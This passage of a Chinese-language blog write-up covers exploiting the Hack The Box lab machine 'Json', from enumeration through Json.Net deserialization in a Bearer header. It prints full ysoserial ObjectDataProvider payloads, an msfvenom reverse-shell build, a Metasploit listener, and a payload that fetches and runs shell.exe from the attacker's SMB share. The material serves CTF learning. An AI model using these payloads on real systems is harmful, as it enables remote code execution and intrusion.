Windows RPC<br>Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>|_nbstat: NetBIOS name: JSON, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:6f:ff (VMware)<br>| smb-security-mode: <br>|   account_used: &lt;blank&gt;<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>| smb2-security-mode: <br>|   3.0.2: <br>|_    Message signing enabled but not required<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-04-09T10:03:30<br>|_  start_date: 2022-04-09T09:49:04<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br><span class="hljs-comment"># Nmap done at Sat Apr  9 18:03:40 2022 -- 1 IP address (1 host up) scanned in 839.40 seconds</span><br></code></pre></td></tr></table></figure><p>21端口不允许匿名登录，也不无相关漏洞：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit FileZilla ftpd    <br>Exploits: No Results<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><p>我访问了80端口，但是贼有意思，会在访问的那一刻进入一个正常页面：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220409180913867.png" alt="image-20220409180913867"  /><p>但是紧接着会跳转到一个登录页面：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220409180952169.png" alt="image-20220409180952169"  /><p>那我岂不是把进入页面发起的重定向请求拦截掉，就会产生未授权访问漏洞，可惜是，我试了下不知道何种原因它不行，但是理论上是可以的。应该是某种环境问题。</p><p>然而我不需要纠结是否可利用未授权漏洞了，因为admin&#x2F;admin它就登录进去了，粗略一扫主页面没什么能够供我点击的地方，还做了个假按钮来骗我，右上方的生成报告根本不会产生任何请求，也不会跳转到任何地方，就是在原地TP。好吧，整个页面都是假的，甚至连搜索框都是假的，消息提示也是假的，整个页面除了左边的Charts与Tables会弹出404页面，其他都是假的。</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220409181945479.png" alt="image-20220409181945479"  /><p>或许Wappalyzer是真的：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220409182202649.png" alt="image-20220409182202649"  /><p>IIS服务组件，windows server系统，ASP.NET环境。路径爆破一波：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">[18:21:23] Starting: <br>[18:21:27] 403 -  312B  - /%2e%2e//google.com                              <br>[18:21:27] 301 -  146B  - /js  -&gt;  http://10.10.10.158/js/                 <br>[18:21:39] 403 -    3KB - /Trace.axd                                        <br>[18:21:40] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           <br>[18:22:05] 301 -  147B  - /css  -&gt;  http://10.10.10.158/css/                <br>[18:22:11] 301 -  149B  - /files  -&gt;  http://10.10.10.158/files/            <br>[18:22:11] 403 -    1KB - /files/                                           <br>[18:22:15] 301 -  147B  - /img  -&gt;  http://10.10.10.158/img/                <br>[18:22:15] 200 -   39KB - /index.html                                       <br>[18:22:17] 400 -    4KB - /jolokia/exec/java.lang:<span class="hljs-built_in">type</span>=Memory/gc            <br>[18:22:17] 400 -    4KB - /jolokia/write/java.lang:<span class="hljs-built_in">type</span>=Memory/Verbose/true <br>[18:22:17] 400 -    4KB - /jolokia/search/*:j2eeType=J2EEServer,*<br>[18:22:17] 400 -    4KB - /jolokia/exec/com.sun.management:<span class="hljs-built_in">type</span>=DiagnosticCommand/vmSystemProperties<br>[18:22:17] 400 -    4KB - /jolokia/exec/com.sun.management:<span class="hljs-built_in">type</span>=DiagnosticCommand/help/*<br>[18:22:17] 400 -    4KB - /jolokia/exec/com.sun.management:<span class="hljs-built_in">type</span>=DiagnosticCommand/jfrStart/filename=!/tmp!/foo<br>[18:22:17] 400 -    4KB - /jolokia/exec/com.sun.management:<span class="hljs-built_in">type</span>=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd<br>[18:22:17] 400 -    4KB - /jolokia/exec/com.sun.management:<span class="hljs-built_in">type</span>=DiagnosticCommand/jvmtiAgentLoad/!/etc!/passwd<br>[18:22:17] 400 -    4KB - /jolokia/exec/com.sun.management:<span class="hljs-built_in">type</span>=DiagnosticCommand/vmLog/output=!/tmp!/pwned<br>[18:22:17] 400 -    4KB - /jolokia/exec/com.sun.management:<span class="hljs-built_in">type</span>=DiagnosticCommand/vmLog/disable<br>[18:22:17] 400 -    4KB - /jolokia/read/java.lang:<span class="hljs-built_in">type</span>=Memory/HeapMemoryUsage/used<br>[18:22:17] 403 -    1KB - /js/<br>[18:22:17] 400 -    4KB - /jolokia/read/java.lang:<span class="hljs-built_in">type</span>=*/HeapMemoryUsage    <br>[18:22:19] 200 -    4KB - /login.html                                       <br>[18:22:47] 301 -  149B  - /views  -&gt;  http://10.10.10.158/views/  <br></code></pre></td></tr></table></figure><p>所有301页面都会这样：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220409182408425.png" alt="image-20220409182408425"  /><p>但是看目标靶机标签是反序列化，那目前我能找到的反序列化点，只有在登录框了，因为它有个标志性的Remember me，它也为我返回了标志性的set cookie：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220409223333969.png" alt="image-20220409223333969"  /><p>但它并不是shiro，它的cookie字段是这样的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=<br></code></pre></td></tr></table></figure><p>base64解码后是这样：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<span class="hljs-string">&quot;Id&quot;</span>:1,<span class="hljs-string">&quot;UserName&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;Password&quot;</span>:<span class="hljs-string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>,<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-string">&quot;User Admin HTB&quot;</span>,<span class="hljs-string">&quot;Rol&quot;</span>:<span class="hljs-string">&quot;Administrator&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>密码是以md5哈希形式存储传输的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -n admin | <span class="hljs-built_in">md5sum</span><br>21232f297a57a5a743894a0e4a801fc3  <br></code></pre></td></tr></table></figure><p>紧接着我会抓到第二个包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api/Account/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.158<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/plain, */*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Bearer</span><span class="hljs-punctuation">: </span>eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.10.10.158/index.html<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>OAuth2=eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=<br></code></pre></td></tr></table></figure><p>其Bearer字段与cookie字段看起来是一样的啊，我尝试把cookie字段更改一下，服务器会返回我以下数据包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json; charset=utf-8<br><span class="hljs-attribute">Expires</span><span class="hljs-punctuation">: </span>-1<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>Microsoft-IIS/8.5<br><span class="hljs-attribute">X-AspNet-Version</span><span class="hljs-punctuation">: </span>4.0.30319<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>ASP.NET<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Sat, 09 Apr 2022 16:04:17 GMT<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>119<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;Id&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;UserName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;Password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;Name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;User Admin HTB&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;Rol&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Administrator&quot;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p>没什么用，不管如何更改都会回复以上数据包，但是Bearer字段就不一样，只要对其进行更改，服务端就会报错：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">500</span> Internal Server Error<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json; charset=utf-8<br><span class="hljs-attribute">Expires</span><span class="hljs-punctuation">: </span>-1<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>Microsoft-IIS/8.5<br><span class="hljs-attribute">X-AspNet-Version</span><span class="hljs-punctuation">: </span>4.0.30319<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>ASP.NET<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Sat, 09 Apr 2022 16:04:58 GMT<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>132<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;Message&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;An error has occurred.&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;ExceptionMessage&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Invalid format base64&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;ExceptionType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;System.Exception&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;StackTrace&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p>这样看起来反序列化注入点在Bearer字段，接着我找到了如下工具包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/frohoff/ysoserial<br></code></pre></td></tr></table></figure><p>虽然是exe，但是可以在windows使用生成对应payload再复制到kalinux中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\ysoserial.exe -f Json.Net -o <span class="hljs-built_in">base64</span> -c <span class="hljs-string">&quot;ping 10.10.16.9&quot;</span> -g ObjectDataProvider<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIHBpbmcgMTAuMTAuMTYuOSddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9<br></code></pre></td></tr></table></figure><p>解码后就是这样：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><br>    &#x27;$type&#x27;<span class="hljs-punctuation">:</span>&#x27;System.Windows.Data.ObjectDataProvider<span class="hljs-punctuation">,</span> PresentationFramework<span class="hljs-punctuation">,</span> Version=<span class="hljs-number">4.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-punctuation">,</span> Culture=neutral<span class="hljs-punctuation">,</span> PublicKeyToken=<span class="hljs-number">31</span>bf3856ad364e35&#x27;<span class="hljs-punctuation">,</span> <br><br>    &#x27;MethodName&#x27;<span class="hljs-punctuation">:</span>&#x27;Start&#x27;<span class="hljs-punctuation">,</span><br><br>    &#x27;MethodParameters&#x27;<span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br><br>        &#x27;$type&#x27;<span class="hljs-punctuation">:</span>&#x27;System.Collections.ArrayList<span class="hljs-punctuation">,</span> mscorlib<span class="hljs-punctuation">,</span> Version=<span class="hljs-number">4.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-punctuation">,</span> Culture=neutral<span class="hljs-punctuation">,</span> PublicKeyToken=b77a5c561934e089&#x27;<span class="hljs-punctuation">,</span><br><br>        &#x27;$values&#x27;<span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span>&#x27;cmd&#x27;<span class="hljs-punctuation">,</span> &#x27;/c ping <span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.9</span>&#x27;<span class="hljs-punctuation">]</span><br><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><br>    &#x27;ObjectInstance&#x27;<span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>&#x27;$type&#x27;<span class="hljs-punctuation">:</span>&#x27;System.Diagnostics.Process<span class="hljs-punctuation">,</span> System<span class="hljs-punctuation">,</span> Version=<span class="hljs-number">4.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-punctuation">,</span> Culture=neutral<span class="hljs-punctuation">,</span> PublicKeyToken=b77a5c561934e089&#x27;<span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>我可以本地监听ICMP流量来验证漏洞利用是否成功：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">tcpdump -<span class="hljs-selector-tag">i</span> tun0 icmp and <span class="hljs-attribute">src</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.158</span><br></code></pre></td></tr></table></figure><p>然后构造以下数据包发送给目标服务器，cookie字段在我测试时发现有它无它根本没什么关系：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api/Account/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.158<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/plain, */*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Bearer</span><span class="hljs-punctuation">: </span>ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIHBpbmcgMTAuMTAuMTYuOSddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.10.10.158/index.html<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>OAuth2=<br></code></pre></td></tr></table></figure><p>tcpdump监听到了来自目标icmp协议的流量包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">tcpdump: verbose output suppressed, use -v[v]... <span class="hljs-keyword">for</span> full protocol decode<br>listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes<br>10:27:37.302600 IP 10.10.10.158 &gt; 10.10.16.9: ICMP <span class="hljs-built_in">echo</span> request, <span class="hljs-built_in">id</span> 1, <span class="hljs-built_in">seq</span> 5, length 40<br>10:27:38.225115 IP 10.10.10.158 &gt; 10.10.16.9: ICMP <span class="hljs-built_in">echo</span> request, <span class="hljs-built_in">id</span> 1, <span class="hljs-built_in">seq</span> 6, length 40<br>10:27:39.241911 IP 10.10.10.158 &gt; 10.10.16.9: ICMP <span class="hljs-built_in">echo</span> request, <span class="hljs-built_in">id</span> 1, <span class="hljs-built_in">seq</span> 7, length 40<br>10:27:40.256337 IP 10.10.10.158 &gt; 10.10.16.9: ICMP <span class="hljs-built_in">echo</span> request, <span class="hljs-built_in">id</span> 1, <span class="hljs-built_in">seq</span> 8, length 40<br></code></pre></td></tr></table></figure><p>看来我利用成功了，确实是这么回事，那我可以将对应的ping命令替换为我希望执行的命令，我试着通过wget为目标传入一个载荷或是nc，但是只要加了-O参数就会石沉大海毫无回应出现未知错误。导致我也无法得知我将nc与载荷传入到了目标什么地方。所以我建立了一个smb文件共享，让其执行我共享文件中的载荷，首先本地Metasploit启动相应的监听器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf-pro exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> LhOST 10.10.16.9<br>LhOST =&gt; 10.10.16.9<br>msf-pro exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> LPORT 4444<br>LPORT =&gt; 4444<br>msf-pro exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br>payload =&gt; windows/meterpreter/reverse_tcp<br>msf-pro exploit(multi/handler) &gt; run<br></code></pre></td></tr></table></figure><p>并生成对应载荷：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.9 LPORT=4444 -f exe &gt; shell.exe<br></code></pre></td></tr></table></figure><p>然后在生成的载荷目录启动smb文件共享：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">impacket-smbserver share .<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation<br><br>[*] Config file parsed<br>[*] Callback added <span class="hljs-keyword">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0<br>[*] Callback added <span class="hljs-keyword">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0<br>[*] Config file parsed<br>[*] Config file parsed<br>[*] Config file parsed<br></code></pre></td></tr></table></figure><p>再用Ysoserial生成载荷</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\ysoserial.exe -f Json.Net -o <span class="hljs-built_in">base64</span> -c <span class="hljs-string">&quot;net use \\10.10.16.9\share &amp; \\10.10.16.9\share\shell.exe&quot;</span> -g ObjectDataProvider<br></code></pre></td></tr></table></figure><p>得到以下base64编码后的载荷：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIG5ldCB1c2UgXFxcXDEwLjEwLjE2LjlcXHNoYXJlICYgXFxcXDEwLjEwLjE2LjlcXHNoYXJlXFxzaGVsbC5leGUnXQ0KICAgIH0sDQogICAgJ09iamVjdEluc3RhbmNlJzp7JyR0eXBlJzonU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknfQ0KfQ==<br></code></pre></td></tr></table></figure><p>可以解码看一眼有无错误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<br><br>    <span class="hljs-string">&#x27;$type&#x27;</span>:<span class="hljs-string">&#x27;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#x27;</span>, <br><br>    <span class="hljs-string">&#x27;MethodName&#x27;</span>:<span class="hljs-string">&#x27;Start&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;MethodParameters&#x27;</span>:&#123;<br><br>        <span class="hljs-string">&#x27;$type&#x27;</span>:<span class="hljs-string">&#x27;System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#x27;</span>,<br><br>        <span class="hljs-string">&#x27;$values&#x27;</span>:[<span class="hljs-string">&#x27;cmd&#x27;</span>, <span class="hljs-string">&#x27;/c net use \\\\10.10.16.9\\share &amp; \\\\10.10.16.9\\share\\shell.exe&#x27;</span>]<br><br>    &#125;,<br>a<br>    <span class="hljs-string">&#x27;ObjectInstance&#x27;</span>:&#123;<span class="hljs-string">&#x27;$type&#x27;</span>:<span 